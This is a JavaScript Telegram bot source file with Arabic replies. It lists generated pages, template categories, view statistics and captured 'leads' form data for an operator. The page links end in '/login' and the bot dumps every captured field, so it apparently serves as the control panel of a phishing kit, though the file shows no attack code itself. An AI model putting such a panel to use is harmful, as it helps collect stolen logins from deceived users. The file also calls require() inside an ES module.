import { Telegraf } from 'telegraf';
import db from './db.js';
import { getTemplate, getCategories } from './templates.js';

const token = process.env.BOT_TOKEN;
export const bot = (token && token !== 'test_bot_token_here') ? new Telegraf(token) : null;

if (bot) {
  bot.start(async ctx => {
    try {
      await ctx.reply('أهلاً 👋\n\nالأوامر:\n/pages — الصفحات\n/templates — القوالب\n/stats — إحصائيات\n/leads — الليدز');
    } catch (err) {
      console.error('start command error:', err.message);
    }
  });

  bot.command('pages', async ctx => {
    try {
      const rows = db.prepare('SELECT id, slug, title, views FROM pages ORDER BY id DESC LIMIT 10').all();
      if (!rows.length) return ctx.reply('مفيش صفحات لسه.');
      const base = process.env.BASE_URL || '';
      ctx.reply(rows.map(p => `#${p.id} ${p.title}\n${base}/p/${p.slug}/login\n👁 ${p.views}`).join('\n\n'));
    } catch (err) {
      console.error('pages command error:', err.message);
      ctx.reply('❌ خطأ في تحميل الصفحات');
    }
  });

  bot.command('templates', async ctx => {
    try {
      const rows = getCategories().map(c => [{ text: `${c.name} (${c.count})`, callback_data: `cat_${c.id}` }]);
      ctx.reply('🎨 اختار قطاع:', { reply_markup: { inline_keyboard: rows } });
    } catch (err) {
      console.error('templates command error:', err.message);
    }
  });

  bot.action(/^cat_(.+)$/, async ctx => {
    try {
      const cat = ctx.match[1];
      const list = require('./templates.js').TEMPLATES.filter(t => t.category === cat);
      const chunks = [];
      for (let i = 0; i < list.length; i += 3) {
        chunks.push(list.slice(i, i + 3).map(t => [{ text: `${t.name}`, callback_data: `pick_${t.id}` }]));
      }
      ctx.editMessageText(`📁 ${cat}: `, { reply_markup: { inline_keyboard: chunks.flat() } }).catch(() => {});
    } catch (err) {
      console.error('action cat_ error:', err.message);
    }
  });

  bot.command('stats', async ctx => {
    try {
      const pages = db.prepare('SELECT COUNT(*) c FROM pages').get().c;
      const leads = db.prepare('SELECT COUNT(*) c FROM leads').get().c;
      const views = db.prepare('SELECT COALESCE(SUM(views),0) v FROM pages').get().v;
      ctx.reply(`📊 إحصائيات\n\nصفحات: ${pages}\nمشاهدات: ${views}\nليدز: ${leads}`);
    } catch (err) {
      console.error('stats command error:', err.message);
      ctx.reply('❌ خطأ');
    }
  });

  bot.command('leads', async ctx => {
    try {
      const rows = db.prepare('SELECT l.*, p.title FROM leads l JOIN pages p ON p.id = l.page_id ORDER BY l.id DESC LIMIT 5').all();
      if (!rows.length) return ctx.reply('مفيش ليدز لسه.');
      ctx.reply(rows.map(l => {
        const d = JSON.parse(l.data);
        const body = Object.entries(d).map(([k, v]) => `${k}: ${v}`).join('\n');
        return `📩 ${l.title}\n${body}`;
      }).join('\n\n'));
    } catch (err) {
      console.error('leads command error:', err.message);
      ctx.reply('❌ خطأ');
    }
  });

  bot.catch((err, ctx) => {
    console.error('Bot error:', err.message);
  });
}

export async function notify(text, extra = {}) {
  if (!bot || !process.env.ADMIN_CHAT_ID || process.env.ADMIN_CHAT_ID === '123456789') return;
  try {
    await bot.telegram.sendMessage(process.env.ADMIN_CHAT_ID, text, { parse_mode: 'HTML', ...extra });
  } catch (e) {
    console.error('notify failed:', e.message);
  }
}
